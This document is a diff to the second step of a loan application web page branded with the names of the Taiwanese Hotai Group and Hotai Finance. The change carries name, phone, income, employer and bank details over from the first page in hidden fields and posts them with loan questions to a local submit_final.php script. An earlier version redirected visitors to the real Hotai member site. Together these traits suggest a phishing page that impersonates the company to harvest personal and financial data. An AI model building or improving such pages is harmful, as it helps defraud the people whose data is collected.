@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>和泰集團</title>
+    <title>和泰集團 - 第二步</title>
     <link rel="stylesheet" href="style.css">
     <style>
         .form-subtitle {
@@ -18,11 +18,33 @@
         }
     </style>
     <script>
-        function handleSubmit(event) {
-            event.preventDefault(); // 防止表單的默認提交
-            alert('資料已送出 - 請耐心等候');
-            window.location.href = 'https://www.hotaimember.com.tw/member/'; // 替換成你想跳轉的網址
-        }
+        document.addEventListener('DOMContentLoaded', function() {
+            // 獲取URL查詢字符串並解析
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+
+            // 将第一页的数据填充到表单中（可以隐藏这些字段）
+            const form = document.querySelector('form');
+
+            // 你可以选择将这些数据放入隐藏的input中，或者直接发送到服务器
+            ['name', 'phone', 'gender', 'age', 'city', 'industry', 'company', 'position', 'work_years', 'income', 'salary_transfer', 'bank', 'other_bank'].forEach(field => {
+                const value = urlParams.get(field);
+                if (value) {
+                    const hiddenInput = document.createElement('input');
+                    hiddenInput.type = 'hidden';
+                    hiddenInput.name = field;
+                    hiddenInput.value = value;
+                    form.appendChild(hiddenInput);
+                }
+            });
+
+            // 最终提交表单时，将所有数据发送到服务器
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // 防止表单默认提交
+                alert('資料已送出 - 請耐心等候');
+                form.submit();
+            });
+        });
     </script>
 </head>
 <body>
@@ -32,7 +54,7 @@
             <h1>和潤企業股份有限公司</h1>
         </div>
         <div class="form-title">名下貸款情況</div>
-        <form onsubmit="handleSubmit(event)">
+        <form action="submit_final.php" method="post">
             <!-- 名下貸款情況 -->
             <div class="form-group">
                 <label>名下有無其他貸款業務：</label>
@@ -50,7 +72,7 @@
             </div>
             
             <!-- 申辦準備資料 -->
-            <div class="form-subtitle">申辦準備資料</div> <!-- 子標題 -->
+            <div class="form-subtitle">申辦準備資料</div>
             <div class="form-group">
                 <label for="loan_amount">申請需求金額：</label>
                 <select id="loan_amount" name="loan_amount" required>
